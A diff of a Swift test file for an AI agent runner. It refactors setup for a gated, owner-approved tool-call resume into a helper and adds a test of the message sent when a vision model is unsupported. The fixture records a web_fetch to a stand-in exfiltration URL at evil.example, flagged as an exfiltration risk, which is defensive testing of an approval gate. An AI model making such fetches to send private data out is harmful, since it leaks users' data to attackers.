@@ -669,6 +669,82 @@ func latestRunState(_ queue: DatabaseQueue) throws -> String? {
   }
 }
 
+/// Drives an `Env`'s run through the real store choreography an approval resume replays — pick up,
+/// suspend on a gated fetch, then the owner's approve claiming and filling the observation — and
+/// hands back the message id `resume` binds its context to. File-internal so the image-replay suite
+/// resumes the same way this one does rather than restating forty lines of setup.
+func suspendOnAGatedFetchThenApprove(
+  env: Env,
+  origin: RunOrigin = .interactive,
+  now: Date
+) async throws -> Int64 {
+  let runs = RunStoreGRDB(writer: env.queue)
+  _ = try #require(try runs.pickUp(runId: env.runId, policyVersion: nil, now: now))
+  try await env.queue.write { db in
+    try db.execute(
+      sql: "UPDATE runs SET origin = ? WHERE id = ?",
+      arguments: [origin.rawValue, env.runId]
+    )
+  }
+
+  let receipt = try runs.commitSuspendedTurn(
+    runId: env.runId,
+    sessionId: env.sessionId,
+    commit: SuspendedTurnCommit(
+      assistantContent: "",
+      toolCallsJSON: #"[{"id":"f1","name":"web_fetch","arguments":"{}"}]"#,
+      completedObservations: [],
+      pending: PendingToolAction(
+        toolCallId: "f1",
+        recorded: RecordedToolAction(
+          tool: "web_fetch",
+          canonicalArgsJSON: #"{"url":"https://evil.example/steal"}"#,
+          argsHash: "hash",
+          canonicalTarget: "https://evil.example/steal",
+          reason: .exfilTrifecta,
+          presentation: ToolApprovalPresentation(
+            blastRadius: "egress to evil.example",
+            contentPreview: nil,
+            warnings: []
+          )
+        )
+      ),
+      ownerUserId: env.chatId,
+      nonce: ApprovalNonce.generate(),
+      promptChunks: [],
+      setTainted: true,
+      setPrivateData: true,
+      expiresTs: now.addingTimeInterval(3_600)
+    ),
+    now: now
+  )
+
+  let claim = try runs.claimApprovedExecution(
+    runId: env.runId,
+    observationMessageId: receipt.observationMessageId,
+    notResumableObservationContent: "stopped",
+    now: now
+  )
+  #expect(claim == .committed)
+  try runs.fillClaimedObservation(
+    runId: env.runId,
+    observationMessageId: receipt.observationMessageId,
+    fill: ClaimedObservationFill(
+      content: "the fetched page body",
+      status: .ok,
+      setTainted: true,
+      setPrivateData: false,
+      audit: ApprovedExecutionAudit(
+        tool: "web_fetch",
+        argsRedacted: #"{"url":"https://evil.example/steal"}"#
+      ),
+      now: now
+    )
+  )
+
+  return receipt.observationMessageId
+}
+
 private func okResponse(content: String) -> ChatResponse {
   ChatResponse(
     content: content,
@@ -832,6 +908,29 @@ private func okResponse(content: String) -> ChatResponse {
     #expect(pending.count == 1)
     let firstPending = try #require(pending.first)
     #expect(firstPending.payload == Degradation.providerUnavailable)
+  }
+
+  @Test func visionRefusalEnqueuesCopyNamingTheModelRatherThanAnOutage() async throws {
+    // given — the route refused because the configured model cannot look at images
+    let env = try makeEnv(agentOutcome: .fail(.visionUnsupported))
+
+    // when
+    try await env.runner.run(
+      runId: env.runId,
+      sessionId: env.sessionId,
+      chatId: env.chatId,
+      triggerMessageId: env.triggerMessageId
+    )
+
+    // then — the owner is told what to change, not to try again in a moment, and the reply names
+    // the one remedy that works without a config edit and a restart
+    let pending = try env.outbox.pendingOutbound()
+    let firstPending = try #require(pending.first)
+    #expect(firstPending.payload == Degradation.visionUnsupported)
+    #expect(firstPending.payload != Degradation.providerUnavailable)
+    #expect(firstPending.payload.contains("/new"))
+    #expect(firstPending.payload.contains("CLAW_LLM_MODEL"))
+    #expect(firstPending.payload.contains("CLAW_IMAGE_INPUT"))
   }
 
   @Test func diskFullDuringCommitIsRethrownForTheStorageFullPath() async throws {
@@ -1187,81 +1286,25 @@ private func okResponse(content: String) -> ChatResponse {
       agentOutcome: .respond(okResponse(content: "Fetched and summarized.")),
       now: { fixedNow }
     )
-    let runs = RunStoreGRDB(writer: env.queue)
-    _ = try #require(try runs.pickUp(runId: env.runId, policyVersion: nil, now: fixedNow))
-    try await env.queue.write { db in
-      try db.execute(
-        sql: "UPDATE runs SET origin = 'scheduled' WHERE id = ?",
-        arguments: [env.runId]
-      )
-    }
-    let receipt = try runs.commitSuspendedTurn(
-      runId: env.runId,
-      sessionId: env.sessionId,
-      commit: SuspendedTurnCommit(
-        assistantContent: "",
-        toolCallsJSON: #"[{"id":"f1","name":"web_fetch","arguments":"{}"}]"#,
-        completedObservations: [],
-        pending: PendingToolAction(
-          toolCallId: "f1",
-          recorded: RecordedToolAction(
-            tool: "web_fetch",
-            canonicalArgsJSON: #"{"url":"https://evil.example/steal"}"#,
-            argsHash: "hash",
-            canonicalTarget: "https://evil.example/steal",
-            reason: .exfilTrifecta,
-            presentation: ToolApprovalPresentation(
-              blastRadius: "egress to evil.example",
-              contentPreview: nil,
-              warnings: []
-            )
-          )
-        ),
-        ownerUserId: env.chatId,
-        nonce: ApprovalNonce.generate(),
-        promptChunks: [],
-        setTainted: true,
-        setPrivateData: true,
-        expiresTs: fixedNow.addingTimeInterval(3_600)
-      ),
+    let observationMessageId = try await suspendOnAGatedFetchThenApprove(
+      env: env,
+      origin: .scheduled,
       now: fixedNow
     )
 
-    // when — the owner's approval claims and fills the observation, then the run resumes
-    let claim = try runs.claimApprovedExecution(
-      runId: env.runId,
-      observationMessageId: receipt.observationMessageId,
-      notResumableObservationContent: "stopped",
-      now: fixedNow
-    )
-    #expect(claim == .committed)
-    try runs.fillClaimedObservation(
-      runId: env.runId,
-      observationMessageId: receipt.observationMessageId,
-      fill: ClaimedObservationFill(
-        content: "the fetched page body",
-        status: .ok,
-        setTainted: true,
-        setPrivateData: false,
-        audit: ApprovedExecutionAudit(
-          tool: "web_fetch",
-          argsRedacted: #"{"url":"https://evil.example/steal"}"#
-        ),
-        now: fixedNow
-      )
-    )
+    // when — the owner's approval claimed and filled the observation, so the run resumes
     await env.runner.resume(
       runId: env.runId,
       sessionId: env.sessionId,
       chatId: env.chatId,
-      contextBoundMessageId: receipt.observationMessageId
+      contextBoundMessageId: observationMessageId
     )
 
     // then — the resume assembled under the proactive prompt (no /schedule token), replayed THIS
     // run's partial exchange (a .tool-role message), and skipped recall
     #expect(try latestRunState(env.queue) == RunState.done.rawValue)
     let resumeRequest = try #require(await env.provider.requests.last)
-    let resumeSystem = try #require(resumeRequest.messages.first?.content)
+    let resumeSystem = try #require(resumeRequest.messages.first?.content.text)
     #expect(resumeRequest.messages.first?.role == .system)
     #expect(resumeSystem.contains("started by your own scheduler"))
     #expect(resumeSystem.contains("/schedule") == false)
@@ -1272,7 +1315,7 @@ private func okResponse(content: String) -> ChatResponse {
     )
     #expect(
       resumeRequest.messages.contains { message in
-        message.content.contains("label=\"recall\"")
+        message.content.text.contains("label=\"recall\"")
       } == false
     )
   }
